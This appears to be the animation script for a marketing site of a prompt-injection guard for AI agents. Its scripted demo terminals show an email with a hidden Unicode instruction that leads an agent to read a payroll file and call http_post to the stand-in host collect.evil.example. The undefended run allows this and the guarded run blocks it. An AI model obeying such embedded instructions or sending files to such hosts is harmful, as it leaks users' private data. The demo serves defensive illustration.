/* Everything the site does once it is on screen.

   The design was exported from a canvas whose behaviour lived in a
   <script type="text/x-dc"> block. A browser never runs that, which is why the
   exported pages sat completely still. This file is the port: the same hooks
   the designer put in the markup (data-reveal, data-draw, data-count and the
   rest), driven by GSAP, anime.js and Motion, plus the scroll work the static
   export could not carry.

   Three rules hold throughout:
     - every library is optional. If a bundle fails to load, the page still
       reads: nothing is left at opacity 0 waiting for a tween that never runs.
     - prefers-reduced-motion gets end states immediately, not a faster version
       of the same movement.
     - one file serves all three pages; each routine asks whether its hook is
       present before doing anything.
*/
(function () {
  "use strict";

  var REDUCED = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
  var $ = function (sel, root) { return (root || document).querySelector(sel); };
  var $$ = function (sel, root) {
    return Array.prototype.slice.call((root || document).querySelectorAll(sel));
  };
  var gsap = null, anime = null, Motion = null;

  /* ---------------------------------------------------------------- data */

  var MONO = "500 13.5px/1.9 var(--font-mono)";
  var LINE = {
    cmd: { font: MONO, color: "#ffffff", marginBottom: "6px" },
    user: { font: MONO, color: "#cfcac5" },
    dim: { font: MONO, color: "var(--mg-code-dim)" },
    warn: { font: MONO, color: "#ffb08f" },
    muf: { font: MONO, color: "#8fd8a8" },
    out: { font: MONO, color: "#cfcac5" },
    ok: { font: MONO, color: "#7fbf93" },
    block: { font: "600 13.5px/1.9 var(--font-mono)", color: "#ff7a62" },
    reason: { font: MONO, color: "#e9e6e3" },
    bad: { font: "600 14px/1.9 var(--font-mono)", color: "#ff7a62", marginTop: "10px" },
    good: { font: "600 14px/1.9 var(--font-mono)", color: "#7fbf93", marginTop: "10px" }
  };

  var UNDEFENDED = [
    ["cmd", "$ python tools/hero_attack.py --no-muffle"],
    ["user", "› user: summarise my inbox and file today's invoices"],
    ["dim", "· reading inbox — 7 messages"],
    ["warn", "· email #5 from hr@corp.example  [1 hidden instruction, not removed]"],
    ["out", "› model: read_file(path='finance/payroll_q3.csv')"],
    ["ok", "  ALLOW read_file"],
    ["out", "› model: http_post(url='https://collect.evil.example/u', body=…)"],
    ["ok", "  ALLOW http_post  — no guard is running"],
    ["bad", "✗ payroll_q3.csv left the building. Nobody saw the instruction."]
  ];
  var DEFENDED = [
    ["cmd", "$ python tools/hero_attack.py"],
    ["user", "› user: summarise my inbox and file today's invoices"],
    ["dim", "· reading inbox — 7 messages"],
    ["muf", "· muffle  email #5 — 1 hidden instruction removed (invisible Unicode)"],
    ["out", "› model: read_file(path='finance/payroll_q3.csv')"],
    ["ok", "  ALLOW read_file  — target chosen by the user"],
    ["out", "› model: http_post(url='https://collect.evil.example/u', body=…)"],
    ["block", "  BLOCK http_post(url='https://collect.evil.example/u', ...)"],
    ["reason", "        The url 'collect.evil.example' came from email #5 from"],
    ["reason", "        hr@corp.example, not from you."],
    ["good", "✓ audit #0412 written · hash chain verified"]
  ];

  var INBOX = [
    ["ops@corp.example", "Standup moved to 10:15"],
    ["billing@vendor.example", "Invoice 4471 attached"],
    ["no-reply@tickets.example", "Your ticket was closed"],
    ["maya@corp.example", "Re: Q3 numbers"],
    ["hr@corp.example", "Q3 payroll review — due Friday"],
    ["news@weekly.example", "This week in infra"],
    ["billing@vendor.example", "Invoice 4472 attached"]
  ];
  var LEFT = [
    ["cmd", "$ agent.run(request)  [no guard]"],
    ["dim", "· read_inbox() — 7 messages"],
    ["warn", "· email #5 carries 1 hidden instruction — passed through"],
    ["out", "› read_file(path='finance/payroll_q3.csv')"],
    ["ok", "  ALLOW read_file"],
    ["out", "› http_post(url='https://collect.evil.example/u', body=…)"],
    ["ok", "  ALLOW http_post"],
    ["bad", "✗ the file left the building"]
  ];
  var RIGHT = [
    ["cmd", "$ agent.run(request)  [muffle + policy]"],
    ["dim", "· read_inbox() — 7 messages"],
    ["muf", "· muffle email #5 — 1 instruction removed (invisible Unicode)"],
    ["out", "› read_file(path='finance/payroll_q3.csv')"],
    ["ok", "  ALLOW read_file — target chosen by the user"],
    ["out", "› http_post(url='https://collect.evil.example/u', body=…)"],
    ["block", "  BLOCK http_post(url='https://collect.evil.example/u', ...)"],
    ["reason", "        The url 'collect.evil.example' came from email #5"],
    ["reason", "        from hr@corp.example, not from you."],
    ["good", "✓ 4 entries sealed · head recorded"]
  ];
  var AUDIT = [
    ["0409", "read_inbox", "ALLOW", "—", "9f2c…04ab"],
    ["0410", "muffle email #5", "REMOVED 1", "9f2c…04ab", "41e7…b190"],
    ["0411", "read_file payroll_q3.csv", "ALLOW", "41e7…b190", "c08d…771f"],
    ["0412", "http_post collect.evil.example", "BLOCK", "c08d…771f", "5a13…e2c6"],
    ["0413", "head recorded", "SEALED", "5a13…e2c6", "77bc…2d40"]
  ];

  /* --------------------------------------------------------------- utils */

  function esc(s) {
    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;")
      .replace(/>/g, "&gt;").replace(/"/g, "&quot;");
  }

  function cssText(v) {
    if (v == null) return "";
    if (typeof v === "string") return v;
    return Object.keys(v).map(function (k) {
      return k.replace(/[A-Z]/g, function (m) { return "-" + m.toLowerCase(); }) + ":" + v[k];
    }).join(";");
  }

  /* Render a list into the container the port left behind, cloning the row
     markup the designer drew rather than rebuilding it here. */
  function renderList(name, items) {
    var tpl = $('[data-tpl="' + name + '"]');
    if (!tpl) return [];
    // The template is also the anchor: rows go in as its siblings. A wrapper
    // element cannot be used, because the audit list lives inside a <tbody>
    // and the parser evicts any <div> there, dragging the rows out with it.
    var parent = tpl.parentNode;
    var raw = tpl.innerHTML;
    $$('[data-row="' + name + '"]', parent).forEach(function (n) { n.remove(); });
    var added = [];
    items.forEach(function (item) {
      var markup = raw.replace(/\{\{\s*\w+\.(\w+)\s*\}\}/g, function (_, key) {
        return esc(cssText(item[key]));
      });
      var slot = document.createElement("template");
      slot.innerHTML = markup;
      Array.prototype.slice.call(slot.content.children).forEach(function (node) {
        node.setAttribute("data-row", name);
        parent.insertBefore(node, tpl);
        added.push(node);
      });
    });
    return added;
  }

  function bind(name, text) {
    $$('[data-bind="' + name + '"]').forEach(function (el) { el.textContent = text; });
  }

  function onSeen(el, fn, ratio, margin) {
    if (!("IntersectionObserver" in window)) return fn();
    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (e) {
        if (!e.isIntersecting) return;
        io.disconnect();
        fn();
      });
    }, { threshold: ratio || 0, rootMargin: margin || "0px 0px -8% 0px" });
    io.observe(el);
  }

  var timers = [];
  function later(fn, ms) { timers.push(setTimeout(fn, ms)); }
  function clearLater() { timers.forEach(clearTimeout); timers = []; }

  /* --------------------------------------------------------------- theme */

  var theme = "light";

  function setTheme(next) {
    theme = next;
    var dark = next === "dark";
    document.documentElement.setAttribute("data-theme", next);
    try { localStorage.setItem("mg-theme", next); } catch (e) { /* private window */ }
    $$("[data-logo-light]").forEach(function (el) { el.style.opacity = dark ? "0" : "1"; });
    $$("[data-logo-dark]").forEach(function (el) { el.style.opacity = dark ? "1" : "0"; });
    var ll = $("[data-lbl-l]"), ld = $("[data-lbl-d]");
    if (ll) ll.style.color = dark ? "var(--mg-ink)" : "#fff";
    if (ld) ld.style.color = dark ? "#fff" : "var(--mg-ink)";
    var knob = $("[data-knob]");
    if (knob) {
      knob.style.transition = REDUCED ? "none" : "transform .35s cubic-bezier(.2,.9,.2,1)";
      knob.style.transform = dark ? "translateX(26px)" : "translateX(0px)";
    }
  }

  /* ------------------------------------------------- 1. scroll reveals */

  function reveals() {
    var els = $$("[data-reveal]");
    if (!els.length) return;
    if (REDUCED || !gsap) return;
    els.forEach(function (el) { gsap.set(el, { opacity: 0, y: 26 }); });
    els.forEach(function (el) {
      onSeen(el, function () {
        gsap.to(el, { opacity: 1, y: 0, duration: 0.8, ease: "power3.out", overwrite: true });
      }, 0, "0px 0px -5% 0px");
    });
    // Anything already on screen when the libraries finish loading must not be
    // left hidden waiting for a scroll that never comes.
    later(function () {
      els.forEach(function (el) {
        var r = el.getBoundingClientRect();
        if (r.top < innerHeight && r.bottom > 0) {
          gsap.to(el, { opacity: 1, y: 0, duration: 0.6, ease: "power3.out", overwrite: true });
        }
      });
    }, 900);
  }

  /* ------------------------- 2. the illustrations draw themselves on */

  function art() {
    var scopes = $$("[data-cast], [data-figures]");
    if (!scopes.length) return;

    scopes.forEach(function (scope) {
      var all = $$("[data-draw]", scope);
      var strokes = all.filter(function (e) { return e.getAttribute("stroke") !== "none"; });
      var fills = all.filter(function (e) { return e.getAttribute("stroke") === "none"; });

      if (REDUCED || !anime) return;

      fills.forEach(function (e) {
        e.style.opacity = "0";
        e.style.transformBox = "fill-box";
        e.style.transformOrigin = "center bottom";
      });

      onSeen(scope, function () {
        if (scope.dataset.played) return;
        scope.dataset.played = "1";
        // the outline is inked first, then the solids drop in behind it
        anime({
          targets: strokes, strokeDashoffset: [anime.setDashoffset, 0],
          easing: "easeInOutSine", duration: 820, delay: anime.stagger(26)
        });
        anime({
          targets: fills, opacity: [0, 1], scaleY: [0.78, 1],
          easing: "easeOutBack", duration: 620, delay: anime.stagger(38, { start: 140 })
        });
        idle(scope);
      }, 0.2);
    });
  }

  /* 3. idle float, 4. the villain's lean */
  function idle(scope) {
    if (REDUCED || !gsap) return;
    $$("[data-fig]", scope).forEach(function (g, i) {
      gsap.to(g, {
        y: i % 2 ? -5 : -9, duration: 2.4 + i * 0.35, yoyo: true, repeat: -1,
        ease: "sine.inOut", delay: 0.9 + i * 0.18
      });
    });
    var villain = $("[data-villain-fig]", scope);
    if (villain) {
      gsap.to(villain, {
        rotation: 2.5, transformOrigin: "50% 100%", duration: 1.9,
        yoyo: true, repeat: -1, ease: "sine.inOut", delay: 1.4
      });
    }
  }

  /* --------------------------------- 5. the hand-drawn boil */

  /* Real pen-and-paper animation redraws every frame, so the line never sits
     perfectly still. Reproduced here by displacing the figures through a
     turbulence filter and reseeding it a few times a second: the outline
     wobbles the way an inked one does, without touching any transform the
     float tween owns. */
  function boil() {
    if (REDUCED || !gsap) return;
    var figs = $$("[data-cast] [data-fig]");
    if (!figs.length) return;

    var holder = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    holder.setAttribute("aria-hidden", "true");
    holder.setAttribute("width", "0");
    holder.setAttribute("height", "0");
    holder.style.cssText = "position:absolute;width:0;height:0;overflow:hidden";
    holder.innerHTML =
      '<filter id="mg-boil" x="-12%" y="-12%" width="124%" height="124%">' +
      '<feTurbulence type="fractalNoise" baseFrequency="0.016" numOctaves="1" seed="1" result="n"/>' +
      '<feDisplacementMap in="SourceGraphic" in2="n" scale="1.9" xChannelSelector="R" yChannelSelector="G"/>' +
      "</filter>";
    document.body.appendChild(holder);

    var turb = holder.querySelector("feTurbulence");
    figs.forEach(function (g) { g.style.filter = "url(#mg-boil)"; });

    var seed = 1, last = 0;
    gsap.ticker.add(function (time) {
      if (time - last < 0.125) return;   // ~8fps, the rate hand-drawn cels run at
      last = time;
      seed = seed % 4 + 1;
      turb.setAttribute("seed", String(seed));
    });
  }

  /* ----------------------------------- 6. the cast watches the cursor */

  function eyes() {
    var pupils = $$("[data-eye]");
    if (!pupils.length || REDUCED) return;
    var pending = null;
    window.addEventListener("pointermove", function (ev) {
      if (pending) return;
      pending = requestAnimationFrame(function () {
        pending = null;
        pupils.forEach(function (p) {
          var box = p.ownerSVGElement.getBoundingClientRect();
          if (!box.width) return;
          var dx = (ev.clientX - (box.left + box.width / 2)) / box.width;
          var dy = (ev.clientY - (box.top + box.height / 2)) / box.height;
          var r = Number(p.getAttribute("data-eye")) || 2.2;
          var k = Math.min(1, Math.hypot(dx, dy));
          p.style.transform = "translate(" + (dx / (k || 1) * r * k).toFixed(2) + "px," +
            (dy / (k || 1) * r * k).toFixed(2) + "px)";
        });
      });
    }, { passive: true });
  }

  /* ------------------------------- 7. parallax  8. rules draw */

  function scrollEffects() {
    if (REDUCED || !gsap || !window.ScrollTrigger) return;
    gsap.registerPlugin(window.ScrollTrigger);

    var poster = $("[data-poster]");
    if (poster) {
      gsap.fromTo(poster, { y: 36 }, {
        y: -18, ease: "none",
        scrollTrigger: { trigger: poster, start: "top bottom", end: "bottom top", scrub: 0.6 }
      });
    }

    // every 2px divider inks itself across as it arrives
    $$("section").forEach(function (sec) {
      var top = getComputedStyle(sec).borderTopWidth;
      if (top === "0px" || !sec.previousElementSibling) return;
      gsap.fromTo(sec, { "--mg-rule": "0%" }, {
        scrollTrigger: { trigger: sec, start: "top 92%" }, duration: 0.9, ease: "power2.out"
      });
    });

    later(function () { window.ScrollTrigger.refresh(); }, 1200);
  }

  /* ------------------------------------------ 10. the hero typewriter */

  var replayHero = null;

  function hero() {
    var type = $("[data-type]"), strike = $("[data-strike]"), refusal = $("[data-refusal]");
    var caret = $("[data-caret]");
    if (!type || !strike || !refusal) return;

    // Muted by default; the toggle only appears if audio is possible here.
    if (window.MG_MUFFLE) window.MG_MUFFLE.mountToggle($("[data-sound-host]"));

    // The noise floor, fed from the muffle's own audio graph.
    // The policy sandbox: started only when it is actually on screen, so a
    // physics engine is not running against an empty viewport.
    var sandboxHost = $("[data-sandbox]");
    if (sandboxHost && window.MG_PHYS) {
      var box = window.MG_PHYS.sandbox(sandboxHost);
      if (box) onSeen(sandboxHost, box.start, 0.3);
    }

    var floorHost = $("[data-noise-floor]");
    if (floorHost && window.MG_FX) {
      var wf = window.MG_FX.waveform(floorHost);
      if (wf) window.MG_FX_SINK = wf.attach;
    }

    if (REDUCED || !anime) {
      strike.style.width = "100%";
      refusal.style.opacity = "1";
      if (caret) caret.style.display = "none";
      return;
    }

    type.style.width = "auto";
    var wrap = type.parentElement;
    var full = Math.min(type.scrollWidth, wrap.clientWidth || type.scrollWidth);
    type.style.width = "0px";
    strike.style.width = "0px";
    refusal.style.opacity = "0";
    refusal.style.transform = "translateY(16px)";

    replayHero = function () {
      if (window.MG_MUFFLE) window.MG_MUFFLE.reset(type);
      strike.style.width = "0px";
      if (caret) caret.style.display = "inline-block";
      anime.remove(type); anime.remove(strike); anime.remove(refusal);
      anime({
        targets: type, width: [0, full], duration: 1500, easing: "steps(46)",
        complete: function () {
          if (caret) caret.style.display = "none";
          // the instruction is struck out, then the refusal lands under it.
          // The muffle runs on the same beat: one cutoff value drives a
          // lowpass on an audio tone and a Gaussian convolution over the
          // sentence, so what you hear and what you see are one filter.
          if (window.MG_MUFFLE) window.MG_MUFFLE.run(type, 1200);
          anime({
            targets: strike, width: [0, full], duration: 520, easing: "easeInOutQuad",
            complete: function () {
              anime({
                targets: refusal, opacity: [0, 1], translateY: [16, 0],
                duration: 620, easing: "easeOutCubic",
                // One burst, on the frame the call is refused: the panel
                // separates into channels and tears, the way a frame does
                // when the data behind it is malformed. Once, here, only.
                begin: function () {
                  if (window.MG_GLITCH) window.MG_GLITCH.burst(refusal, 150);
                }
              });
            }
          });
        }
      });
    };
    onSeen(type, replayHero, 0.4);
  }

  /* ------------------------------------------- 11. the scrolled story */

  var storyAt = -1;

  function story() {
    var steps = $$("[data-step]");
    if (!steps.length) return;
    var nodes = $$("[data-node]");
    var verdict = $("[data-verdict]"), l1 = $("[data-l1]"), l2 = $("[data-l2]");

    var ACTIVE = { 0: [0], 1: [0, 1], 2: [0, 1, 3, 5], 3: [0, 1, 2], 4: [0, 1, 2, 3, 4], 5: [0, 1, 2, 3, 4] };
    var HOT = { 2: 5, 5: 4 };
    var VERDICT = ["waiting", "tainted content read", "data exfiltrated", "instruction removed", "tracing targets", "refused"];
    var COLOR = ["var(--mg-muted)", "var(--mg-muted)", "var(--mg-hot)", "var(--mg-ink)", "var(--mg-ink)", "var(--mg-hot)"];

    function paint(i) {
      if (storyAt === i) return;
      storyAt = i;
      var on = ACTIVE[i] || [];
      nodes.forEach(function (n, idx) {
        var bar = $("[data-bar]", n);
        var lit = on.indexOf(idx) >= 0;
        var danger = HOT[i] === idx;
        if (bar) bar.style.background = danger ? "var(--mg-hot)" : (lit ? "var(--mg-line)" : "var(--mg-faint)");
        n.style.borderColor = danger ? "var(--mg-hot)" : "var(--mg-line)";
        n.style.opacity = lit ? "1" : "0.42";
        if (danger && !REDUCED && gsap) {
          gsap.fromTo(n, { x: -5 }, { x: 0, duration: 0.4, ease: "power2.out" });
        }
      });
      if (verdict) { verdict.textContent = VERDICT[i]; verdict.style.color = COLOR[i]; }
      if (l1) {
        var off = i < 3;
        l1.textContent = off ? "off" : "1 removed";
        l1.style.color = off ? "var(--mg-muted)" : "var(--mg-ink)";
      }
      if (l2) {
        l2.textContent = i >= 5 ? "BLOCK" : "tracing";
        l2.style.color = i >= 5 ? "var(--mg-hot)" : "var(--mg-muted)";
      }
    }

    if (!("IntersectionObserver" in window)) return paint(5);
    var io = new IntersectionObserver(function (es) {
      es.forEach(function (e) {
        if (e.isIntersecting) paint(Number(e.target.getAttribute("data-step")));
      });
    }, { rootMargin: "-45% 0px -45% 0px", threshold: 0 });
    steps.forEach(function (s) { io.observe(s); });
  }

  /* ------------------------------------------------- 12. the counters */

  function counters() {
    var els = $$("[data-count]");
    if (!els.length) return;
    els.forEach(function (el) {
      var target = Number(el.getAttribute("data-count"));
      var suffix = el.getAttribute("data-suffix") || "";
      if (REDUCED || !anime) { el.textContent = target + suffix; return; }
      el.textContent = "0" + suffix;
      onSeen(el, function () {
        var obj = { v: 0 };
        anime({
          targets: obj, v: target, duration: 1400, easing: "easeOutExpo", round: 1,
          update: function () { el.textContent = Math.round(obj.v) + suffix; }
        });
      }, 0.6);
    });
  }

  /* ----------------------------------------- 13. the magnetic buttons */

  function magnets() {
    var els = $$("[data-magnetic]");
    if (!els.length || REDUCED) return;
    els.forEach(function (el) {
      el.addEventListener("pointermove", function (ev) {
        var b = el.getBoundingClientRect();
        var x = (ev.clientX - b.left - b.width / 2) * 0.22;
        var y = (ev.clientY - b.top - b.height / 2) * 0.3;
        if (Motion) Motion.animate(el, { transform: "translate(" + x + "px," + y + "px)" }, { duration: 0.25 });
        else el.style.transform = "translate(" + x + "px," + y + "px)";
      });
      el.addEventListener("pointerleave", function () {
        if (Motion) Motion.animate(el, { transform: "translate(0px,0px)" }, { duration: 0.5, easing: [0.2, 1.2, 0.3, 1] });
        else el.style.transform = "";
      });
    });
  }

  /* ----------------- 14. the terminal  15. the BLOCK stamp */

  function stamp(node) {
    if (REDUCED || !anime) return;
    anime({
      targets: node, scale: [2.1, 1], opacity: [0, 1], rotate: [-7, 0],
      duration: 480, easing: "easeOutBack"
    });
    var card = node.closest("[data-term-card]") || node.parentElement;
    if (card && gsap) gsap.fromTo(card, { x: -4 }, { x: 0, duration: 0.45, ease: "elastic.out(1,0.35)" });
  }

  function playTerminal(listName, script, onLine, done) {
    var shown = [];
    script.forEach(function (ln, i) {
      later(function () {
        shown.push({ text: ln[1], style: LINE[ln[0]] || LINE.dim });
        var nodes = renderList(listName, shown);
        var last = nodes[nodes.length - 1];
        if (last && !REDUCED && anime) {
          anime({ targets: last, opacity: [0, 1], translateX: [-10, 0], duration: 260, easing: "easeOutCubic" });
        }
        if (last && ln[0] === "block") stamp(last);
        if (onLine) onLine(ln, i, last);
        if (i === script.length - 1 && done) done();
      }, i * 380 + 120);
    });
  }

  function demo() {
    if (!$('[data-list="lines"]')) return;
    var state = $("[data-runstate]");

    function run(mode) {
      clearLater();
      var script = mode === "undefended" ? UNDEFENDED : DEFENDED;
      renderList("lines", []);
      bind("hintLine", "█");
      if (state) { state.textContent = "running …"; state.style.color = "#cfcac5"; }
      playTerminal("lines", script, null, function () {
        bind("hintLine", "");
        if (!state) return;
        state.textContent = mode === "undefended" ? "breach" : "blocked · logged";
        state.style.color = mode === "undefended" ? "#ff7a62" : "#7fbf93";
      });
    }

    window.__mgRun = run;
    bind("hintLine", "$ _");
    var section = $("#demo");
    if (section) onSeen(section, function () { run("defended"); }, 0, "0px 0px -20% 0px");
  }

  /* -------------------------------------- 16. the carrier accordions */

  function carrier(card) {
    var body = $("[data-payload]", card), chev = $("[data-chev]", card);
    if (!body) return;
    var open = body.getAttribute("data-open") === "1";
    var h = body.scrollHeight;
    body.setAttribute("data-open", open ? "0" : "1");
    if (Motion && !REDUCED) {
      Motion.animate(body, { height: open ? [h + "px", "0px"] : ["0px", h + "px"] },
        { duration: 0.42, easing: [0.2, 0.9, 0.2, 1] });
    } else {
      body.style.height = open ? "0px" : h + "px";
    }
    if (chev) chev.style.transform = open ? "rotate(0deg)" : "rotate(45deg)";
  }

  /* ------------------------------------------- 17. the nav scroll-spy */

  function spy() {
    var links = $$("header nav a[href^='#']");
    if (!links.length || !gsap || !window.ScrollTrigger) return;
    links.forEach(function (a) {
      var target = document.getElementById(a.getAttribute("href").slice(1));
      if (!target) return;
      a.style.transition = "opacity .25s ease";
      window.ScrollTrigger.create({
        trigger: target, start: "top 40%", end: "bottom 40%",
        onToggle: function (self) {
          a.style.color = self.isActive ? "var(--mg-hot)" : "var(--mg-ink)";
          a.style.opacity = self.isActive ? "1" : "0.72";
        }
      });
    });
  }

  /* ------------------------------- 18. the results rows fill on scrub */

  function bars() {
    var rows = $$("[data-fill]");
    if (!rows.length || REDUCED || !gsap || !window.ScrollTrigger) return;
    rows.forEach(function (row) {
      var to = Number(row.getAttribute("data-fill"));
      // the bar is the number: the unguarded row fills solid red and the two
      // guarded rows stay visibly empty, which is the table's own punchline
      gsap.fromTo(row, { scaleX: 0 }, {
        scaleX: to / 100, transformOrigin: "left center", ease: "none",
        scrollTrigger: { trigger: row.parentElement, start: "top 90%", end: "top 60%", scrub: 0.5 }
      });
    });
  }

  /* ------------------------------------------ 19-20. the Attack Lab */

  function lab() {
    if (!$('[data-list="inbox"]')) return;
    var flagged = false, tampered = false, rows = [];
    var layers = { muffle: true, clf: false };
    var note = $("[data-inbox-note]");
    var CELL = "border-right:2px solid var(--mg-line);border-bottom:2px solid var(--mg-line);" +
      "padding:16px 14px;min-height:104px";

    function paintInbox() {
      renderList("inbox", INBOX.map(function (m, i) {
        var hot = i === 4 && flagged;
        return {
          from: m[0], subject: m[1],
          flag: hot ? "hidden instruction" : "",
          style: CELL + (hot
            ? ";background:var(--mg-bg);outline:2px solid var(--mg-hot);outline-offset:-2px"
            : ";background:var(--mg-panel)"),
          flagStyle: "font:700 9.5px/1.3 Archivo;letter-spacing:.14em;text-transform:uppercase;" +
            "color:var(--mg-hot);margin-top:10px;min-height:12px"
        };
      }));
    }

    function paintAudit() {
      var nodes = renderList("audit", rows.map(function (r, i) {
        var broken = tampered && i === 2;
        return {
          n: r[0], checkpoint: r[1],
          decision: broken ? "ALLOW → edited" : r[2],
          follows: r[3], hash: r[4],
          style: broken ? "background:color-mix(in srgb, var(--mg-hot) 12%, transparent)" : "",
          decisionStyle: "font:700 12.5px/1.4 var(--font-mono);color:" +
            (r[2] === "BLOCK" || broken ? "var(--mg-hot)" : "var(--mg-ink)")
        };
      }));
      var last = nodes[nodes.length - 1];
      if (last && !REDUCED && anime) {
        anime({ targets: last, opacity: [0, 1], translateY: [-8, 0], duration: 320, easing: "easeOutCubic" });
      }
    }

    function verdict(sel, text, color) {
      var el = $(sel);
      if (el) { el.textContent = text; el.style.color = color; }
    }

    function banner(kind, text) {
      var b = $("[data-chain-banner]"), dot = $("[data-chain-dot]"), t = $("[data-chain-text]");
      var col = kind === "ok" ? "#2f9e63" : kind === "bad" ? "var(--mg-hot)" : "var(--mg-faint)";
      if (b) b.style.borderColor = kind === "idle" ? "var(--mg-faint)" : col;
      if (dot) dot.style.background = col;
      if (t) { t.textContent = text; t.style.color = kind === "idle" ? "var(--mg-muted)" : col; }
      if (b && anime && !REDUCED) {
        anime({ targets: b, translateX: [-6, 0], opacity: [0.4, 1], duration: 380, easing: "easeOutCubic" });
      }
    }

    function runBoth() {
      clearLater();
      flagged = false; tampered = false; rows = [];
      paintInbox();
      renderList("left", []); renderList("right", []); renderList("audit", []);
      bind("leftHint", "█"); bind("rightHint", "█");
      verdict("[data-verdict-left]", "running …", "var(--mg-muted)");
      verdict("[data-verdict-right]", "running …", "var(--mg-muted)");
      if (note) { note.textContent = "7 messages · scanning"; note.style.color = "var(--mg-muted)"; }

      later(function () {
        flagged = true;
        paintInbox();
        if (note) { note.textContent = "email #5 · hidden instruction found"; note.style.color = "var(--mg-hot)"; }
        var card = $$('[data-row="inbox"]')[4];
        if (card && anime && !REDUCED) {
          anime({ targets: card, scale: [0.97, 1], duration: 420, easing: "easeOutBack" });
        }
      }, 760);

      var right = layers.muffle ? RIGHT : RIGHT.filter(function (l) { return l[0] !== "muf"; });
      playTerminal("left", LEFT, null, function () {
        bind("leftHint", "");
        verdict("[data-verdict-left]", "breach", "var(--mg-hot)");
      });
      playTerminal("right", right, null, function () {
        bind("rightHint", "");
        verdict("[data-verdict-right]", "blocked · logged", "#2f9e63");
        AUDIT.forEach(function (r, k) {
          later(function () { rows.push(r); paintAudit(); }, k * 150);
        });
      });
    }

    window.__mgLab = {
      runBoth: runBoth,
      toggleLayer: function (btn) {
        var key = btn.getAttribute("data-layer");
        layers[key] = !layers[key];
        btn.style.background = layers[key] ? "var(--mg-hot)" : "transparent";
        btn.style.color = layers[key] ? "#fff" : "var(--mg-ink)";
        if (anime && !REDUCED) anime({ targets: btn, scale: [0.94, 1], duration: 260, easing: "easeOutBack" });
      },
      checkChain: function () {
        if (!rows.length) return banner("idle", "Nothing to verify yet — run the request first.");
        if (tampered) {
          banner("bad", "Chain broken at entry 0411. Its hash no longer matches the one entry 0412 says it follows.");
        } else {
          banner("ok", "Chain verified. 5 entries, each hash matches the one the next entry records, and the head agrees.");
        }
      },
      tamper: function () {
        if (!rows.length) return banner("idle", "Nothing to edit yet — run the request first.");
        tampered = true;
        paintAudit();
        banner("bad", "Entry 0411 was edited in place. Nothing visibly changed in the table metadata — now press Check the chain.");
      }
    };

    paintInbox();
    later(runBoth, 900);
  }

  /* --------------------------------------------------------- actions */

  var ACTIONS = {
    toggleTheme: function () { setTheme(theme === "dark" ? "light" : "dark"); },
    replayHero: function () { if (replayHero) replayHero(); },
    runUndefended: function () { if (window.__mgRun) window.__mgRun("undefended"); },
    runDefended: function () { if (window.__mgRun) window.__mgRun("defended"); },
    toggleCarrier: function (el) {
      carrier(el);
      // Opening a carrier runs the scan across its hidden line: the
      // classifier reading the message, drawn as the search it is.
      var payload = el.querySelector("[data-payload]");
      if (!payload || !window.MG_FX) return;
      if (!el.__scan) {
        var hot = payload.querySelector("[style*='--mg-hot']") || payload;
        el.__scan = window.MG_FX.scan(payload, hot.textContent || "");
      }
      if (el.__scan) setTimeout(el.__scan.run, 180);   // after it has opened
    },
    runBoth: function () { if (window.__mgLab) window.__mgLab.runBoth(); },
    toggleLayer: function (el) { if (window.__mgLab) window.__mgLab.toggleLayer(el); },
    checkChain: function () { if (window.__mgLab) window.__mgLab.checkChain(); },
    tamper: function () { if (window.__mgLab) window.__mgLab.tamper(); }
  };

  function wireActions() {
    document.addEventListener("click", function (ev) {
      var el = ev.target.closest("[data-action]");
      if (!el) return;
      var fn = ACTIONS[el.getAttribute("data-action")];
      if (!fn) return;
      ev.preventDefault();
      fn(el, ev);
    });
  }

  /* ------------------------------------------------------------ boot */

  function waitForLibraries(done) {
    var t0 = Date.now();
    (function tick() {
      gsap = window.gsap || null;
      anime = window.anime || null;
      Motion = (window.Motion && window.Motion.animate) ? window.Motion : null;
      if ((gsap && anime) || Date.now() - t0 > 4000) return done();
      requestAnimationFrame(tick);
    })();
  }

  function start() {
    var saved = null;
    try { saved = localStorage.getItem("mg-theme"); } catch (e) { /* private window */ }
    setTheme(saved === "dark" || saved === "light" ? saved : "light");

    wireActions();
    story();      // observer only, safe before the bundles land
    demo();
    lab();

    waitForLibraries(function () {
      reveals();
      art();
      boil();
      eyes();
      hero();
      counters();
      magnets();
      scrollEffects();
      spy();
      bars();
      document.documentElement.setAttribute("data-motion", gsap ? "on" : "off");
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", start);
  } else {
    start();
  }
})();
